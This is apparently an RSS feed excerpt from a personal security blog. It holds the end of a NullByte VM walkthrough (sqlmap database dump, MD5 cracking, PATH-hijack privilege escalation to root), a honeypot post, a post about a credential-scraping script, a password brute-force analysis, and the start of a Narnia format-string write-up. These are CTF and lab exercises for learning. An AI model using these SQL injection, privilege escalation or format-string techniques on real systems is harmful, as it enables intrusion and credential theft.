&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;root@kali:~# sqlmap -u http://192.168.56.101/kzMb5nVYJw/420search.php?usrtosearch&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;ramses --current-db
back-end DBMS: MySQL 5.0.12
&lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;11:13:44&lt;span style=&#34;color: #f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;INFO&lt;span style=&#34;color: #f92672&#34;&gt;]&lt;/span&gt; fetching current database
current database:    &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;seth&amp;#39;&lt;/span&gt;

root@kali:~# sqlmap -u http://192.168.56.101/kzMb5nVYJw/420search.php?usrtosearch&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;ramses --tables -D seth
&lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;11:13:55&lt;span style=&#34;color: #f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;INFO&lt;span style=&#34;color: #f92672&#34;&gt;]&lt;/span&gt; fetching tables &lt;span style=&#34;color: #66d9ef&#34;&gt;for&lt;/span&gt; database: &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;seth&amp;#39;&lt;/span&gt;
Database: seth
&lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt; table&lt;span style=&#34;color: #f92672&#34;&gt;]&lt;/span&gt;
+-------+
&lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt; users &lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt;
+-------+


root@kali:~# sqlmap -u http://192.168.56.101/kzMb5nVYJw/420search.php?usrtosearch&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;ramses --dump -D seth -T users
Database: seth
Table: users
&lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;2&lt;/span&gt; entries&lt;span style=&#34;color: #f92672&#34;&gt;]&lt;/span&gt;
+----+---------------------------------------------+--------+------------+
&lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt; id &lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt; pass                                        &lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt; user   &lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt; position   &lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt;
+----+---------------------------------------------+--------+------------+
&lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;  &lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt; YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE &lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt; ramses &lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt; &amp;lt;blank&amp;gt;    &lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;2&lt;/span&gt;  &lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt; --not allowed--                             &lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt; isis   &lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt; employee   &lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt;
+----+---------------------------------------------+--------+------------+
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;An MD5 hashed password? I best put that through &lt;a href=&#34;http://md5decoder.org/&#34;&gt;md5decoder&lt;/a&gt; to
be rewarded with the password &lt;code&gt;omega&lt;/code&gt;&lt;/p&gt;

&lt;h1 id=&#34;stage-4:d33d1c43b31d749c4d445e01e4ef8fef&#34;&gt;stage 4&lt;/h1&gt;

&lt;p&gt;Turns out that this is ramses&amp;rsquo;s password on the ssh service that&amp;rsquo;s running on
port 777 on the VM. So I&amp;rsquo;ll connect to that and have a look at what&amp;rsquo;s going on there.&lt;/p&gt;

&lt;p&gt;Not much in his home directory, so I&amp;rsquo;ll checkout what he&amp;rsquo;s been up to&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;ramses@NullByte:~&lt;span style=&#34;color: #f8f8f2&#34;&gt;$ &lt;/span&gt;cat .bash_history 
sudo -s
su eric
&lt;span style=&#34;color: #f8f8f2&#34;&gt;exit&lt;/span&gt;
ls
clear
&lt;span style=&#34;color: #f8f8f2&#34;&gt;cd&lt;/span&gt; /var/www
&lt;span style=&#34;color: #f8f8f2&#34;&gt;cd &lt;/span&gt;backup/
ls
./procwatch 
clear
sudo -s
&lt;span style=&#34;color: #f8f8f2&#34;&gt;cd&lt;/span&gt; /
ls
&lt;span style=&#34;color: #f8f8f2&#34;&gt;exit&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;Interesting, ramses has something in &lt;code&gt;/var/www&lt;/code&gt;. Seems like a setuid root
binary called &lt;code&gt;procwatch&lt;/code&gt;. After running it I would assume that it&amp;rsquo;s just running &lt;code&gt;ps&lt;/code&gt;
to return a list of processes. If I run &lt;code&gt;ps&lt;/code&gt; on its own, I get the same output (minus
procwatch of course)&lt;/p&gt;

&lt;p&gt;So let&amp;rsquo;s see if it calls &lt;code&gt;ps&lt;/code&gt; with an absolute path, or not. As a quick test I&amp;rsquo;ll create
a symlink to &lt;code&gt;ls&lt;/code&gt; in the current directory and name it &lt;code&gt;ps&lt;/code&gt;. Then I set the &lt;code&gt;PATH&lt;/code&gt; environment variable
with the current dir at the front.&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;ramses@NullByte:/var/www/backup&lt;span style=&#34;color: #f8f8f2&#34;&gt;$ &lt;/span&gt;ln -s /bin/ls ps
ramses@NullByte:/var/www/backup&lt;span style=&#34;color: #f8f8f2&#34;&gt;$ export PATH&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;`&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;pwd&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;`&lt;/span&gt;:&lt;span style=&#34;color: #e6db74&#34;&gt;${&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;PATH&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;}&lt;/span&gt;
ramses@NullByte:/var/www/backup&lt;span style=&#34;color: #f8f8f2&#34;&gt;$ &lt;/span&gt;./procwatch 
ls  procwatch  ps  readme.txt
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;Excellent, it just calls &lt;code&gt;ps&lt;/code&gt; without a path. A classic issue you can often
find in programs that call other programs.&lt;/p&gt;

&lt;p&gt;So let me leverage this to get myself a root shell and ultimately the flag&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;ramses@NullByte:/var/www/backup&lt;span style=&#34;color: #f8f8f2&#34;&gt;$ &lt;/span&gt;ln -snf /bin/sh ps
ramses@NullByte:/var/www/backup&lt;span style=&#34;color: #f8f8f2&#34;&gt;$ &lt;/span&gt;./procwatch 
&lt;span style=&#34;color: #75715e&#34;&gt;# whoami &lt;/span&gt;
root
&lt;span style=&#34;color: #75715e&#34;&gt;# cat /root/proof.txt&lt;/span&gt;
&lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;OUTPUT CUT&lt;span style=&#34;color: #f92672&#34;&gt;]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;And that concludes the NullByte VM walkthrough. A nice little machine with some fun
challenges. Thanks to ly0n for creating it.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Honeypotting with Dionaea and Raspi</title>
      <link>http://unlogic.co.uk/2015/07/16/honeypotting-with-dionaea-and-raspi/</link>
      <pubDate>Thu, 16 Jul 2015 00:00:00 +0000</pubDate>
      
      <guid>http://unlogic.co.uk/2015/07/16/honeypotting-with-dionaea-and-raspi/</guid>
      <description>&lt;p&gt;I recently setup a &lt;a href=&#34;http://dionaea.carnivore.it/&#34;&gt;dionaea&lt;/a&gt; honeypot on my Raspberry Pi
and after tweaking and configuring it for a few days have now got a working setup.
It&amp;rsquo;s a low interaction honeypot aimed to capture malware rather than ssh bruteforce
attacks.&lt;/p&gt;

&lt;p&gt;I plan to leave it online for a week or a month, and the analyse the stats and see
what it managed to collect. So far it&amp;rsquo;s mostly conficker variants, but there&amp;rsquo;s a
suprising (to me) large number of infected machines out there. In one 8 hour period
during testing, it managed to collect 8 unique samples from 154 connections.&lt;/p&gt;

&lt;p&gt;Here&amp;rsquo;s the stats from that period:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/j828Fpw.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;It should be fairly interesting to see if anything else comes along during its
uptime.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>I made this: Purplescraper</title>
      <link>http://unlogic.co.uk/2015/05/14/i-made-this-purplescraper/</link>
      <pubDate>Thu, 14 May 2015 00:00:00 +0000</pubDate>
      
      <guid>http://unlogic.co.uk/2015/05/14/i-made-this-purplescraper/</guid>
      <description>&lt;p&gt;Had this script sitting around for a while and I figured I would clean it up
a bit and share it.&lt;/p&gt;

&lt;p&gt;Get &lt;a href=&#34;https://github.com/Svenito/purplescraper&#34;&gt;Purplescraper from my Github&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;In short: you give it a starting directory, which will usually be where all the user
directories are, and it will go get all &lt;code&gt;.purple/accounts.xml&lt;/code&gt; files and extract
any usernames and passwords it finds into a new file.&lt;/p&gt;

&lt;p&gt;Useful to make sure none of your sensitive data is available to other, non
authorised users via slack file permissions.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Revisiting strong passwords</title>
      <link>http://unlogic.co.uk/2015/04/14/revisiting-strong-passwords/</link>
      <pubDate>Tue, 14 Apr 2015 00:00:00 +0000</pubDate>
      
      <guid>http://unlogic.co.uk/2015/04/14/revisiting-strong-passwords/</guid>
      <description>

&lt;p&gt;Some time ago I wrote a post about &lt;a href=&#34;http://unlogic.co.uk/2012/06/06/strong-passwords/&#34;&gt;strong passwords&lt;/a&gt;.
That was three years ago and I figured I might as well revist what I wrote back then.&lt;/p&gt;

&lt;p&gt;Since then technology has moved on a lot, and the number of password breaches has increased,
aswell as the number of reports mocking our poorly chosen passwords.&lt;/p&gt;

&lt;p&gt;As far as I am concerned, I am still using 15-18 random character passwords. I&amp;rsquo;m no longer
lowercase only, but a mixture of upper, lower, digit, and punctuation. The length depends
on how long I am allowed to make my passwords. Believe it or not, some sites limit you to
a maximum length of 12, possibly less on some sites. Silly huh? Not only that, but still they
tell me my 18 character password without punctuation or digits is less secure than a
4 character mixed character password. Hmph.&lt;/p&gt;

&lt;p&gt;But what is cropping up more and more, and what I wanted to write about, is the password
rules on signup pages. For example &amp;ldquo;Your password must be at least 8
characters long, contain one upper case letter, and a number.&amp;rdquo; Sometimes a &lt;em&gt;special
character&lt;/em&gt; is thrown into the mix too. The issue here is, that although your final
password is more secure (in theory), the search space for a valid password is reduced.
With some attackers being able to generate 1 trillion guesses per second, keeping the
size of the search space large will help.&lt;/p&gt;

&lt;p&gt;By how much difference does it make? Well that&amp;rsquo;s what I want to figure out.&lt;/p&gt;

&lt;p&gt;So using the commonly used english alphabet with digits and
special characters we have the following available&lt;/p&gt;

&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Name&lt;/th&gt;
&lt;th&gt;Content&lt;/th&gt;
&lt;th&gt;Character Count&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;

&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;lower&lt;/td&gt;
&lt;td&gt;abcdefghijklmnopqrstuvwxyz&lt;/td&gt;
&lt;td&gt;26&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;upper&lt;/td&gt;
&lt;td&gt;ABCDEFGHIJKLMNOPQRSTUVWXYZ&lt;/td&gt;
&lt;td&gt;26&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;digits&lt;/td&gt;
&lt;td&gt;0123456789&lt;/td&gt;
&lt;td&gt;10&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;special&lt;/td&gt;
&lt;td&gt;!&amp;ldquo;#$%&amp;amp;&amp;lsquo;()*+,-./:;&amp;lt;=&amp;gt;?@[]^_{|}~`&lt;/td&gt;
&lt;td&gt;32&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Let&amp;rsquo;s assume that I have a list of password hashes from somewhere. I know
that the password is exactly 6 characters long (which I think is
a reasonably common password length these days), and I also know what rules
govern the choice of password when it is created. We&amp;rsquo;ll look at these rules in
turn and see how much difference they make. I fix the password length so I don&amp;rsquo;t
introduce too many variables.&lt;/p&gt;

&lt;p&gt;I&amp;rsquo;ll be basing the calculations of a few assumptions:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Hashes are SHA256&lt;/li&gt;
&lt;li&gt;We have a &lt;em&gt;reasonable&lt;/em&gt; PC available (1x NVidia gtx580), managing 355 Mh/s (355,000,000 hashes/s) (&lt;a href=&#34;https://hashcat.net/oclhashcat/#performance&#34;&gt;ref&lt;/a&gt;)&lt;/li&gt;
&lt;li&gt;These are pure bruteforce attacks. No wordlists, permutation or combination attacks&lt;/li&gt;
&lt;li&gt;Timings for each attack assume &lt;em&gt;worst case&lt;/em&gt;. i.e. we have to run through all guesses.
Usually an attack stops when a valid match is found, shortening the attack.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Let&amp;rsquo;s analyse how different password creation rules affect the duration of the attack.&lt;/p&gt;

&lt;p&gt;For reference, these are the number of possible combinations for each set of
characters&lt;/p&gt;

&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Possible characters&lt;/th&gt;
&lt;th&gt;Character count&lt;/th&gt;
&lt;th&gt;Number of combinations&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;

&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;lower only&lt;/td&gt;
&lt;td&gt;26&lt;/td&gt;
&lt;td&gt;308,915,776&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;upper and lower&lt;/td&gt;
&lt;td&gt;52&lt;/td&gt;
&lt;td&gt;19,770,609,664&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;upper, lower, digits&lt;/td&gt;
&lt;td&gt;62&lt;/td&gt;
&lt;td&gt;56,800,235,584&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;upper, lower, digits, special&lt;/td&gt;
&lt;td&gt;94&lt;/td&gt;
&lt;td&gt;689,869,781,056&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;

&lt;h2 id=&#34;no-rules:419b03a80de203f007f6beb7b93557c6&#34;&gt;No rules&lt;/h2&gt;

&lt;p&gt;Using any combination of characters the number of possible passwords is &lt;em&gt;689,869,781,056&lt;/em&gt;.
It would take &lt;em&gt;1943.29 seconds&lt;/em&gt; (689,869,781,056 / 355,000,000) to crack this password.
That&amp;rsquo;s just over half an hour.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Attack time&lt;/em&gt;: 1943.29seconds&lt;/p&gt;

&lt;h2 id=&#34;at-least-one-upper-case:419b03a80de203f007f6beb7b93557c6&#34;&gt;At least one upper case&lt;/h2&gt;

&lt;p&gt;If we are forced to chose at least one upper case character, we are also saying that
there are no passwords now with just lowercase characters. The number of possible
combinations is now &lt;em&gt;689,869,781,056 - 308,915,776 = 689,560,865,280&lt;/em&gt;, or &lt;em&gt;99%&lt;/em&gt; of
the original search space. This is a small impact of only 1 second.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Attack time&lt;/em&gt;: 1942.42seconds&lt;/p&gt;

&lt;h2 id=&#34;at-least-one-upper-case-and-one-digit:419b03a80de203f007f6beb7b93557c6&#34;&gt;At least one upper case and one digit&lt;/h2&gt;

&lt;p&gt;Now we know that there are no passwords with just lowercase, or with lower and uppercase only.
Therefore we can also remove these from the list of possibilities. Our new number is now
&lt;em&gt;689,869,781,056 - 308,915,776 - 19,770,609,664 = 669,790,255,616&lt;/em&gt; or &lt;em&gt;97%&lt;/em&gt; of our search space.
Now we&amp;rsquo;re starting to see savings of up around 100seconds. In the grand scheme of things,
still not much&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Attack time&lt;/em&gt;: 1886.73seconds&lt;/p&gt;

&lt;h2 id=&#34;must-contain-all-of-the-above:419b03a80de203f007f6beb7b93557c6&#34;&gt;Must contain all of the above&lt;/h2&gt;

&lt;p&gt;Upper, lower, digits, and special all need to be present. Therefore we can remove all the
other possiblities for a grand total of:
&lt;em&gt;689,869,781,056 - 308,915,776 - 19,770,609,664 - 56,800,235,584 = 612,990,020,032&lt;/em&gt; or
&lt;em&gt;88%&lt;/em&gt; of the original. Now we&amp;rsquo;ve saved another 100 seconds.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Attack time&lt;/em&gt;: 1726.73seconds&lt;/p&gt;

&lt;h2 id=&#34;conclusion:419b03a80de203f007f6beb7b93557c6&#34;&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;Although contrived, this scenario should indicate that &lt;em&gt;forcing&lt;/em&gt; people to do
things in the interest of security can help attackers too. If we are allowed
to use any character out of the full set, an attack would have taken 4 minutes more than
if we are forced to create a &lt;em&gt;secure&lt;/em&gt; password that &lt;em&gt;must&lt;/em&gt; use certain characters.
The difference isn&amp;rsquo;t much if you look above, but bear in mind that the longest attack
is &lt;em&gt;1.12&lt;/em&gt; times longer. If we extrapolate this to a 8 character password,
it&amp;rsquo;s a difference of almost 2 years (51.18 vs 49.7).&lt;/p&gt;

&lt;p&gt;Needless to say, knowing the minimum length reduces the search space once again,
because now I won&amp;rsquo;t even bother with anything below 8 characters. That&amp;rsquo;s a fairly big
chunk of possibilities.&lt;/p&gt;

&lt;p&gt;The times can be further optimised by employing wordlists, known substitutions and other
rules. The more you know about the nature of the password, the less time it takes
to crack it. Yes, applying rules and substitutions to wordlists takes time, but it&amp;rsquo;s
insignificant to the amount of time they can shave off of a brute force attack. And
the more an attacker knows about the nature and composition of your password, the
better they can tailor their wordlists.&lt;/p&gt;

&lt;p&gt;Even &lt;a href=&#34;http://www.wired.com/2015/04/snowden-sexy-margaret-thatcher-password-isnt-so-sexy/&#34;&gt;Edward Snowden&amp;rsquo;s advice isn&amp;rsquo;t bulletrpoof&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;The key really is not to force people to have a specific password combination, but
to encourage good password creation. Long, random, and unpredictable, passwords
from a large vat of possibilities.&lt;/p&gt;

&lt;p&gt;Don&amp;rsquo;t tell attackers what the password isn&amp;rsquo;t. Let them guess.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Solving Narnia Part 2</title>
      <link>http://unlogic.co.uk/2015/04/13/solving-narnia-part-2/</link>
      <pubDate>Mon, 13 Apr 2015 00:00:00 +0000</pubDate>
      
      <guid>http://unlogic.co.uk/2015/04/13/solving-narnia-part-2/</guid>
      <description>

&lt;p&gt;Carrying on from &lt;a href=&#34;http://unlogic.co.uk/2015/04/08/solving-narnia-part1/&#34;&gt;Part 1&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&#34;level-05:100abf89ce6a11fb3cfc3f5a51e9cb94&#34;&gt;Level 05&lt;/h2&gt;

&lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;stdio.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;stdlib.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;string.h&amp;gt;&lt;/span&gt;
 
&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;main&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;argc,&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;**&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;argv){&lt;/span&gt;
	&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt;
	&lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;buffer[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;64&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;];&lt;/span&gt;

	&lt;span style=&#34;color: #f8f8f2&#34;&gt;snprintf(buffer,&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;sizeof&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;buffer,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;argv[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;]);&lt;/span&gt;
	&lt;span style=&#34;color: #f8f8f2&#34;&gt;buffer[&lt;/span&gt;&lt;span style=&#34;color: #66d9ef&#34;&gt;sizeof&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;(buffer)&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt;
	&lt;span style=&#34;color: #f8f8f2&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;Change i&amp;#39;s value from 1 -&amp;gt; 500. &amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;

	&lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(i&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;==&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;500&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;){&lt;/span&gt;
		&lt;span style=&#34;color: #f8f8f2&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;GOOD&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
		&lt;span style=&#34;color: #f8f8f2&#34;&gt;system(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;/bin/sh&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
	&lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;

	&lt;span style=&#34;color: #f8f8f2&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;No way...let me give you a hint!&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
	&lt;span style=&#34;color: #f8f8f2&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;buffer : [%s] (%d)&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;buffer,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;strlen(buffer));&lt;/span&gt;
	&lt;span style=&#34;color: #f8f8f2&#34;&gt;printf&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;i = %d (%p)&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;i,&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;i);&lt;/span&gt;
	&lt;span style=&#34;color: #66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;

&lt;p&gt;A fixed sized buffer again. This time however trying to overflow it in order to
write to &lt;code&gt;i&lt;/code&gt; won&amp;rsquo;t work. If we look at line 9 and lookup the manpage for &lt;code&gt;snprintf&lt;/code&gt;
we see that&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;The  functions  snprintf() and vsnprintf() write at most size bytes
(including the trailing null byte (&#39;\0&#39;)) to str.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So we won&amp;rsquo;t be able to overflow this buffer. Going through the usual possible exploits
we&amp;rsquo;ve only really go one more to try: &lt;a href=&#34;https://en.wikipedia.org/wiki/Uncontrolled_format_string&#34;&gt;format string attack&lt;/a&gt; or
&lt;em&gt;uncontrolled format string vulnerability&lt;/em&gt;. This happens when user input
isn&amp;rsquo;t checked, and allows the user to use format characters (&lt;code&gt;%s&lt;/code&gt;, &lt;code&gt;%x&lt;/code&gt;) to read or
manipulate the stack.&lt;/p&gt;

&lt;p&gt;For me this is one of the harder exploits to understand, so this level is
great practice for me. So if it doesn&amp;rsquo;t make sense at first, stick with it and
try various strings. Hopefully you&amp;rsquo;ll grok it at some point.&lt;/p&gt;

&lt;p&gt;Let&amp;rsquo;s check to see if our hunch is right. Using a few characters to start, I
then append a list of &lt;code&gt;%x&lt;/code&gt;, which read values from the stack and print them.&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;narnia5@melinda:/narnia$ ./narnia5 &lt;span style=&#34;color: #e6db74&#34;&gt;`&lt;/span&gt;python -c &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;print &amp;#39;aaaa&amp;#39;+&amp;#39;%x&amp;#39;*10&amp;quot;`&lt;/span&gt;
Change i&amp;#39;s value from 1 -&amp;gt; 500. No way...let me give you a hint!
buffer : [aaaaf7eb75b6ffffffffffffd6aef7e2fbf8616161616265376636623537666] (63)
i = 1 (0xffffd6cc)
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Sure enough we see the beginning of the input string after the 4th &lt;code&gt;%x&lt;/code&gt;. So we then
